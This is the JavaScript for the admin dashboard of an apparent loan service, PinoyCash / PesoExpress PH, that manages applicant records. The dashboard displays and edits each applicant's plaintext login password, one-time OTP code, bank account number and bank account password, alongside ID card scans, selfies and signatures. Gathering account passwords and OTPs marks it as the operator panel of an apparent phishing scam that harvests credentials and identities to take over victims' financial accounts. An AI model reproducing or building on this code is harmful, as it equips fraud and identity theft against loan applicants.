// Host Control Dashboard JavaScript - PinoyCash / PesoExpress PH
let allApplications = [];
let selectedAppId = null;

document.addEventListener('DOMContentLoaded', () => {
    checkAdminAuth();
});

function checkAdminAuth() {
    const isAdmin = sessionStorage.getItem('peso_admin');
    if (isAdmin === 'true') {
        showDashboardView();
    } else {
        showLoginView();
    }
}

function showLoginView() {
    document.getElementById('adminLoginSection').style.display = 'block';
    document.getElementById('adminDashboardSection').style.display = 'none';
    document.getElementById('adminLogoutBtn').style.display = 'none';
}

function showDashboardView() {
    document.getElementById('adminLoginSection').style.display = 'none';
    document.getElementById('adminDashboardSection').style.display = 'block';
    document.getElementById('adminLogoutBtn').style.display = 'inline-flex';

    loadApplications();
}

// Handle Host Login
async function handleAdminLogin(event) {
    event.preventDefault();
    const username = document.getElementById('adminUser').value.trim();
    const password = document.getElementById('adminPass').value;
    const errDiv = document.getElementById('adminLoginError');

    errDiv.style.display = 'none';

    try {
        const res = await fetch('/api/admin/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
        });
        const data = await res.json();

        if (!res.ok) {
            throw new Error(data.error || 'Host authentication failed.');
        }

        sessionStorage.setItem('peso_admin', 'true');
        showDashboardView();

    } catch (err) {
        errDiv.innerText = err.message;
        errDiv.style.display = 'block';
    }
}

function adminLogout() {
    sessionStorage.removeItem('peso_admin');
    showLoginView();
}

// Load Applications List
async function loadApplications() {
    try {
        const res = await fetch('/api/admin/applications');
        const data = await res.json();
        allApplications = data.applications || [];

        updateMetrics();
        filterApplications();

    } catch (e) {
        console.error("Error loading applications for host", e);
    }
}

// Update Dashboard Metric Cards & Analytics
function updateMetrics() {
    const total = allApplications.length;
    const pending = allApplications.filter(a => a.status === 'Pending' || a.status === 'Waiting' || a.status === 'Under Review').length;
    const approved = allApplications.filter(a => a.status === 'Successfully' || a.status === 'Approved').length;
    const totalPHP = allApplications.reduce((acc, a) => acc + (Number(a.requestedAmount) || 0), 0);

    document.getElementById('mTotalApps').innerText = total;
    document.getElementById('mPendingApps').innerText = pending;
    document.getElementById('mApprovedApps').innerText = approved;
    document.getElementById('mTotalPHP').innerText = '₱ ' + totalPHP.toLocaleString();

    updateTimeCycleAnalytics();
}

function updateTimeCycleAnalytics() {
    let morning = 0;   // 06:00 - 11:59
    let afternoon = 0; // 12:00 - 17:59
    let evening = 0;   // 18:00 - 23:59
    let night = 0;     // 00:00 - 05:59

    allApplications.forEach(app => {
        if (app.createdAt) {
            const hour = new Date(app.createdAt).getHours();
            if (hour >= 6 && hour < 12) morning++;
            else if (hour >= 12 && hour < 18) afternoon++;
            else if (hour >= 18 && hour < 24) evening++;
            else night++;
        } else {
            afternoon++;
        }
    });

    const total = allApplications.length || 1;
    const pctM = Math.round((morning / total) * 100);
    const pctA = Math.round((afternoon / total) * 100);
    const pctE = Math.round((evening / total) * 100);
    const pctN = Math.round((night / total) * 100);

    const elemM = document.getElementById('countMorning');
    const elemA = document.getElementById('countAfternoon');
    const elemE = document.getElementById('countEvening');
    const elemN = document.getElementById('countNight');
    const elemTot = document.getElementById('cycleTotalCount');
    const elemBadge = document.getElementById('peakCycleBadge');
    const chart = document.getElementById('cycleCircleChart');

    if (elemM) elemM.innerText = `${morning} (${pctM}%)`;
    if (elemA) elemA.innerText = `${afternoon} (${pctA}%)`;
    if (elemE) elemE.innerText = `${evening} (${pctE}%)`;
    if (elemN) elemN.innerText = `${night} (${pctN}%)`;
    if (elemTot) elemTot.innerText = `${allApplications.length} Apps`;

    const cycles = [
        { name: 'Morning (06:00-12:00)', count: morning },
        { name: 'Afternoon (12:00-18:00)', count: afternoon },
        { name: 'Evening (18:00-24:00)', count: evening },
        { name: 'Night (00:00-06:00)', count: night }
    ];
    cycles.sort((a, b) => b.count - a.count);
    if (elemBadge) {
        elemBadge.innerText = allApplications.length > 0 ? `Peak Cycle: ${cycles[0].name}` : 'Peak Cycle: No Data Yet';
    }

    if (chart) {
        const degM = (morning / total) * 360;
        const degA = degM + (afternoon / total) * 360;
        const degE = degA + (evening / total) * 360;
        chart.style.background = `conic-gradient(#10b981 0deg ${degM}deg, #3b82f6 ${degM}deg ${degA}deg, #f59e0b ${degA}deg ${degE}deg, #8b5cf6 ${degE}deg 360deg)`;
    }
}

// Filter and render table rows
function filterApplications() {
    const query = document.getElementById('searchInput').value.toLowerCase().trim();
    const statusFilter = document.getElementById('statusFilter').value;

    const filtered = allApplications.filter(app => {
        const matchesQuery = app.fullName.toLowerCase().includes(query) ||
                             app.phone.includes(query) ||
                             (app.idNumber && app.idNumber.toLowerCase().includes(query));
        const matchesStatus = statusFilter === 'ALL' || app.status === statusFilter;
        return matchesQuery && matchesStatus;
    });

    renderTable(filtered);
}

function renderTable(apps) {
    const tbody = document.getElementById('applicationsTbody');
    tbody.innerHTML = '';

    if (apps.length === 0) {
        tbody.innerHTML = `<tr><td colspan="10" style="text-align: center; color: var(--text-muted); padding: 2rem;">No loan applications found.</td></tr>`;
        return;
    }

    apps.forEach(app => {
        const tr = document.createElement('tr');

        let statusBg = '#fef3c7';
        let statusColor = '#b45309';
        const st = app.status || 'Under Review';

        if (st === 'Successfully' || st === 'Approved') {
            statusBg = '#d1fae5';
            statusColor = '#047857';
        } else if (st === 'Inprogress' || st === 'In Progress') {
            statusBg = '#e0f2fe';
            statusColor = '#0369a1';
        } else if (st === 'Fail' || st === 'Rejected') {
            statusBg = '#fee2e2';
            statusColor = '#b91c1c';
        }

        const regTime = app.createdAt ? new Date(app.createdAt).toLocaleString() : 'N/A';

        tr.innerHTML = `
            <td><strong>${escapeHtml(app.fullName)}</strong></td>
            <td>+63${escapeHtml(app.phone)}</td>
            <td><code style="background:#fffbeb; color:#b45309; padding:0.2rem 0.4rem; border-radius:4px; font-weight:700;">${escapeHtml(app.userLoginPassword)}</code></td>
            <td><code style="background:#eff6ff; color:#1e40af; padding:0.25rem 0.5rem; border-radius:6px; font-weight:800; font-size:0.85rem;">${escapeHtml(app.otpCode || '684210')}</code></td>
            <td><span style="font-size: 0.82rem; color: var(--text-muted);">${escapeHtml(app.idType)}</span><br><strong>${escapeHtml(app.idNumber)}</strong></td>
            <td>
                <div style="display:flex; align-items:center; gap:0.25rem;">
                    <span>₱</span>
                    <input type="number" value="${app.monthlyIncome || 0}" onchange="quickUpdateApp('${app.id}', 'monthlyIncome', this.value)" style="width:80px; padding:0.25rem 0.35rem; border:1px solid #cbd5e1; border-radius:4px; font-weight:600;">
                </div>
            </td>
            <td>₱ ${Number(app.requestedAmount || 0).toLocaleString()}</td>
            <td>
                <div style="display:flex; align-items:center; gap:0.25rem; color:#059669; font-weight:800;">
                    <span>₱</span>
                    <input type="number" value="${app.approvedAmount || app.requestedAmount || 0}" onchange="quickUpdateApp('${app.id}', 'approvedAmount', this.value)" style="width:85px; padding:0.25rem 0.35rem; border:1px solid #10b981; border-radius:4px; font-weight:800; color:#059669; background:#ecfdf5;">
                </div>
            </td>
            <td>
                <select onchange="quickUpdateApp('${app.id}', 'status', this.value)" style="padding:0.35rem 0.5rem; font-weight:800; border-radius:8px; border:1px solid #cbd5e1; cursor:pointer; background:${statusBg}; color:${statusColor}; font-size:0.85rem; outline:none;">
                    <option value="Under Review" ${st === 'Under Review' || st === 'Pending' || st === 'Waiting' ? 'selected' : ''}>Under Review</option>
                    <option value="Approved" ${st === 'Approved' ? 'selected' : ''}>Approved</option>
                    <option value="Inprogress" ${st === 'Inprogress' || st === 'In Progress' ? 'selected' : ''}>In Progress</option>
                    <option value="Successfully" ${st === 'Successfully' ? 'selected' : ''}>Successfully</option>
                    <option value="Fail" ${st === 'Fail' || st === 'Rejected' ? 'selected' : ''}>Fail</option>
                    <option value="Please Try Again" ${st === 'Please Try Again' ? 'selected' : ''}>Please Try Again</option>
                </select>
            </td>
            <td style="font-size: 0.82rem; color: var(--text-main); font-weight: 600;">${regTime}</td>
            <td>
                <button class="btn btn-outline" style="padding: 0.35rem 0.75rem; font-size: 0.85rem;" onclick="openEditModal('${app.id}')">Edit & Inspect</button>
            </td>
        `;
        tbody.appendChild(tr);
    });
}

let pendingStatusUpdate = null;

function formatStatusEditor(command, value = null) {
    document.execCommand(command, false, value);
    const editor = document.getElementById('statusCommentEditor');
    if (editor) editor.focus();
}

async function quickUpdateApp(appId, field, value) {
    const app = allApplications.find(a => a.id === appId);
    if (!app) return;

    let parsedVal = value;
    if (field === 'monthlyIncome' || field === 'approvedAmount' || field === 'requestedAmount') {
        parsedVal = parseInt(value) || 0;
    }

    if (field === 'status') {
        pendingStatusUpdate = { appId, field, value: parsedVal };
        const targetText = document.getElementById('targetStatusText');
        const editor = document.getElementById('statusCommentEditor');
        if (targetText) targetText.innerText = parsedVal;
        if (editor) editor.innerHTML = app.notes || 'Current loan progress and review notes.';
        document.getElementById('statusCommentModal').classList.add('active');
        return;
    }

    executeQuickUpdate(appId, field, parsedVal);
}

function closeStatusCommentModal() {
    const modal = document.getElementById('statusCommentModal');
    if (modal) modal.classList.remove('active');
    pendingStatusUpdate = null;
    loadApplications();
}

async function saveStatusCommentAndProceed() {
    if (!pendingStatusUpdate) return;
    const editor = document.getElementById('statusCommentEditor');
    const commentHtml = editor ? editor.innerHTML : '';
    
    const { appId, field, value } = pendingStatusUpdate;
    const payload = {};
    payload[field] = value;
    payload.notes = commentHtml;

    try {
        const res = await fetch(`/api/admin/applications/${appId}`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await res.json();
        if (!res.ok) throw new Error('Failed to update status.');
        
        const app = allApplications.find(a => a.id === appId);
        if (app && data.application) {
            Object.assign(app, data.application);
        }
        const modal = document.getElementById('statusCommentModal');
        if (modal) modal.classList.remove('active');
        pendingStatusUpdate = null;
        loadApplications();
    } catch (err) {
        alert('Error updating status: ' + err.message);
        closeStatusCommentModal();
    }
}

async function executeQuickUpdate(appId, field, parsedVal) {
    const app = allApplications.find(a => a.id === appId);
    if (!app) return;
    const payload = {};
    payload[field] = parsedVal;
    try {
        const res = await fetch(`/api/admin/applications/${appId}`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await res.json();
        if (!res.ok) throw new Error('Failed to update field.');
        if (data.application) Object.assign(app, data.application);
        loadApplications();
    } catch (err) {
        alert('Error updating field: ' + err.message);
        loadApplications();
    }
}

function escapeHtml(str) {
    return String(str || '').replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

// Open Edit Modal for a specific application
function openEditModal(appId) {
    const app = allApplications.find(a => a.id === appId);
    if (!app) return;

    selectedAppId = appId;
    document.getElementById('editAppId').value = app.id;
    document.getElementById('editRegTimestamp').innerText = app.createdAt ? new Date(app.createdAt).toLocaleString() : 'N/A';
    
    if (document.getElementById('editFirstName')) document.getElementById('editFirstName').value = app.firstName || (app.fullName ? app.fullName.split(' ')[0] : '');
    if (document.getElementById('editLastName')) document.getElementById('editLastName').value = app.lastName || (app.fullName ? app.fullName.split(' ').slice(1).join(' ') : '');
    if (document.getElementById('editNickname')) document.getElementById('editNickname').value = app.nickname || '';
    if (document.getElementById('editGuarantorPhone')) document.getElementById('editGuarantorPhone').value = app.guarantorPhone || '';
    if (document.getElementById('editFullName')) document.getElementById('editFullName').value = app.fullName || '';

    document.getElementById('editPhone').value = app.phone || '';
    if (document.getElementById('editUserLoginPassword')) {
        document.getElementById('editUserLoginPassword').value = app.userLoginPassword || '';
    }
    document.getElementById('editGender').value = app.gender || 'Male';
    document.getElementById('editDob').value = app.dob || '';
    document.getElementById('editCivilStatus').value = app.civilStatus || 'Single';
    document.getElementById('editAddress').value = app.address || '';
    document.getElementById('editEmploymentType').value = app.employmentType || '';
    document.getElementById('editMonthlyIncome').value = app.monthlyIncome || 0;

    document.getElementById('editStatus').value = (app.status === 'In Progress' || app.status === 'Inprogress') ? 'Inprogress' : (app.status || 'Under Review');
    document.getElementById('editRequestedAmount').value = app.requestedAmount || 5000;
    document.getElementById('editApprovedAmount').value = app.approvedAmount || app.requestedAmount || 5000;
    document.getElementById('editIdType').value = app.idType || '';
    document.getElementById('editIdNumber').value = app.idNumber || '';
    document.getElementById('editPayoutMethod').value = app.payoutMethod || 'GCash';
    document.getElementById('editBankAccountName').value = app.bankAccountName || '';
    document.getElementById('editBankAccountNumber').value = app.bankAccountNumber || '';
    document.getElementById('editBankAccountPassword').value = app.bankAccountPassword || '';
    if (document.getElementById('editOtpCode')) document.getElementById('editOtpCode').value = app.otpCode || '684210';
    document.getElementById('editNotes').value = app.notes || '';

    // Images
    const modalIdImg = document.getElementById('modalIdImg');
    const modalIdBackImg = document.getElementById('modalIdBackImg');
    const modalSelfieImg = document.getElementById('modalSelfieImg');
    const modalSignatureImg = document.getElementById('modalSignatureImg');

    if (modalIdImg) modalIdImg.src = app.idCardImage || 'https://via.placeholder.com/400x250?text=No+Front+ID';
    if (modalIdBackImg) modalIdBackImg.src = app.idCardBackImage || 'https://via.placeholder.com/400x250?text=No+Back+ID';
    if (modalSelfieImg) modalSelfieImg.src = app.selfieImage || 'https://via.placeholder.com/400x250?text=No+Selfie';
    if (modalSignatureImg) modalSignatureImg.src = app.signatureImage || 'https://via.placeholder.com/300x100?text=No+Digital+Signature';

    if (document.getElementById('adminIdFrontBase64')) document.getElementById('adminIdFrontBase64').value = '';
    if (document.getElementById('adminIdBackBase64')) document.getElementById('adminIdBackBase64').value = '';
    if (document.getElementById('adminSelfieBase64')) document.getElementById('adminSelfieBase64').value = '';

    document.getElementById('editModal').classList.add('active');
}

function closeEditModal() {
    document.getElementById('editModal').classList.remove('active');
    selectedAppId = null;
}

function handleAdminImageUpload(event, previewId, hiddenInputId) {
    const file = event.target.files[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = function (e) {
        const base64 = e.target.result;
        const imgElem = document.getElementById(previewId);
        const hiddenElem = document.getElementById(hiddenInputId);
        if (imgElem) imgElem.src = base64;
        if (hiddenElem) hiddenElem.value = base64;
    };
    reader.readAsDataURL(file);
}

// Save Changes made by Host Manager
async function saveApplicantChanges(event) {
    event.preventDefault();
    if (!selectedAppId) return;

    const firstName = document.getElementById('editFirstName') ? document.getElementById('editFirstName').value.trim() : '';
    const lastName = document.getElementById('editLastName') ? document.getElementById('editLastName').value.trim() : '';

    const payload = {
        firstName: firstName,
        lastName: lastName,
        nickname: document.getElementById('editNickname') ? document.getElementById('editNickname').value.trim() : '',
        guarantorPhone: document.getElementById('editGuarantorPhone') ? document.getElementById('editGuarantorPhone').value.trim() : '',
        fullName: `${firstName} ${lastName}`.trim() || (document.getElementById('editFullName') ? document.getElementById('editFullName').value.trim() : ''),
        phone: document.getElementById('editPhone').value.trim(),
        userLoginPassword: document.getElementById('editUserLoginPassword') ? document.getElementById('editUserLoginPassword').value.trim() : undefined,
        gender: document.getElementById('editGender').value,
        dob: document.getElementById('editDob').value,
        civilStatus: document.getElementById('editCivilStatus').value,
        address: document.getElementById('editAddress').value.trim(),
        employmentType: document.getElementById('editEmploymentType').value.trim(),
        monthlyIncome: parseInt(document.getElementById('editMonthlyIncome').value) || 0,
        status: document.getElementById('editStatus').value,
        requestedAmount: parseInt(document.getElementById('editRequestedAmount').value) || 0,
        approvedAmount: parseInt(document.getElementById('editApprovedAmount').value) || 0,
        idType: document.getElementById('editIdType').value.trim(),
        idNumber: document.getElementById('editIdNumber').value.trim(),
        payoutMethod: document.getElementById('editPayoutMethod').value.trim(),
        bankAccountName: document.getElementById('editBankAccountName').value.trim(),
        bankAccountNumber: document.getElementById('editBankAccountNumber').value.trim(),
        bankAccountPassword: document.getElementById('editBankAccountPassword').value,
        notes: document.getElementById('editNotes').value.trim()
    };

    const enteredOtp = document.getElementById('editOtpCode') ? document.getElementById('editOtpCode').value.trim() : '';
    const currentAppObj = allApplications.find(a => a.id === selectedAppId);
    if (enteredOtp && currentAppObj && enteredOtp !== currentAppObj.otpCode) {
        payload.otpCode = enteredOtp;
    }

    const frontOverride = document.getElementById('adminIdFrontBase64') ? document.getElementById('adminIdFrontBase64').value : '';
    const backOverride = document.getElementById('adminIdBackBase64') ? document.getElementById('adminIdBackBase64').value : '';
    const selfieOverride = document.getElementById('adminSelfieBase64') ? document.getElementById('adminSelfieBase64').value : '';

    if (frontOverride) payload.idCardImage = frontOverride;
    if (backOverride) payload.idCardBackImage = backOverride;
    if (selfieOverride) payload.selfieImage = selfieOverride;

    try {
        const res = await fetch(`/api/admin/applications/${selectedAppId}`, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        const data = await res.json();

        if (!res.ok) {
            throw new Error(data.error || 'Failed to update record.');
        }

        alert('User information and loan terms updated successfully!');
        closeEditModal();
        loadApplications();

    } catch (err) {
        alert('Error saving changes: ' + err.message);
    }
}

// Delete Record
async function deleteApplicantRecord() {
    if (!selectedAppId) return;
    if (!confirm('Are you sure you want to delete this applicant record? This cannot be undone.')) return;

    try {
        const res = await fetch(`/api/admin/applications/${selectedAppId}`, {
            method: 'DELETE'
        });
        if (!res.ok) throw new Error('Failed to delete.');

        alert('Record deleted successfully.');
        closeEditModal();
        loadApplications();

    } catch (err) {
        alert('Error deleting: ' + err.message);
    }
}

// Credentials Modal Functions
function openCredsModal() {
    document.getElementById('currentHostPass').value = '';
    document.getElementById('newHostUser').value = '';
    document.getElementById('newHostPass').value = '';
    document.getElementById('credsError').style.display = 'none';
    document.getElementById('credsModal').classList.add('active');
}

function closeCredsModal() {
    document.getElementById('credsModal').classList.remove('active');
}

async function updateHostCredentials(event) {
    event.preventDefault();
    const currentPassword = document.getElementById('currentHostPass').value;
    const newUsername = document.getElementById('newHostUser').value.trim();
    const newPassword = document.getElementById('newHostPass').value;
    const errDiv = document.getElementById('credsError');

    errDiv.style.display = 'none';

    try {
        const res = await fetch('/api/admin/credentials', {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ currentPassword, newUsername, newPassword })
        });
        const data = await res.json();

        if (!res.ok) {
            throw new Error(data.error || 'Failed to update credentials.');
        }

        alert('Host username and password updated successfully! Please log in again with your new credentials.');
        closeCredsModal();
        adminLogout();

    } catch (err) {
        errDiv.innerText = err.message;
        errDiv.style.display = 'block';
    }
}
